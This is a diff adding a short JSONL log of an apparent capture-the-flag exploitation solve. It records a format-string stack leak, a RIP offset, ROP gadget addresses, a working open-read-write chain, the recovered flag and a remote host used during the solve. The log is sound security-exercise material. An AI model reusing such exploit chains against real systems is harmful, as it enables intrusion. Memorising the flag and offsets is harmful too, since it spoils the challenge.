@@ -1,0 +1,16 @@
+{"t": "init", "chal": "Red_Tide_Terminal_Revenge", "ts": 1783865085}
+{"t": "alert", "text": "Remote binary differs from downloadable PIE+canary build: remote is non-PIE/no-canary for exploitable frame; local PIE/canary chain is not valid remotely.", "ts": 1783865085}
+{"t": "offset", "k": "rip_offset", "v": "88", "src": "remote write(1,banner) ROP verify", "ts": 1783865085}
+{"t": "offset", "k": "stack_leak_fmt", "v": "%7$p", "src": "remote audit-note format string", "ts": 1783865085}
+{"t": "offset", "k": "stack_stage_delta", "v": "0xa0", "src": "remote raw-syscall second read verified", "ts": 1783865085}
+{"t": "offset", "k": "io_buf", "v": "0x4040a0", "src": "remote writable buffer for ORW output", "ts": 1783865085}
+{"t": "offset", "k": "pop_rdi", "v": "0x4013ec", "src": "remote arbitrary-read gadget farm", "ts": 1783865085}
+{"t": "offset", "k": "pop_rsi", "v": "0x4013f5", "src": "remote arbitrary-read gadget farm", "ts": 1783865085}
+{"t": "offset", "k": "pop_rdx", "v": "0x4013fe", "src": "remote arbitrary-read gadget farm", "ts": 1783865085}
+{"t": "offset", "k": "pop_rax", "v": "0x401407", "src": "remote arbitrary-read gadget farm", "ts": 1783865085}
+{"t": "offset", "k": "syscall_ret", "v": "0x401410", "src": "remote arbitrary-read gadget farm", "ts": 1783865085}
+{"t": "ok", "text": "Remote control-flow verified: RIP offset 88 and gadget farm prints Red Tide Terminal Revenge banner.", "ts": 1783865085}
+{"t": "ok", "text": "Working remote chain: leak stack with %7$p, compute buf=leak-0x60 and stack_stage=buf+0xa0, raw syscall read stage2 to stack_stage, return to stage2, ORW flag.txt.", "ts": 1783865085}
+{"t": "no", "text": "BSS leave_ret pivot and read@plt staging", "reason": "unreliable remotely; raw syscall read directly to stack_stage was verified.", "ts": 1783865085}
+{"t": "note", "text": "Flag recovered, not auto-submitted: grodno{6c6a7520-5c4c-48ef-b4c4-f876d6cf8a32}", "ts": 1783865085}
+{"t": "note", "text": "Reproducer: exploit_remote.py; remote entry used during solve: 10.112.0.12:48349.", "ts": 1783865085}
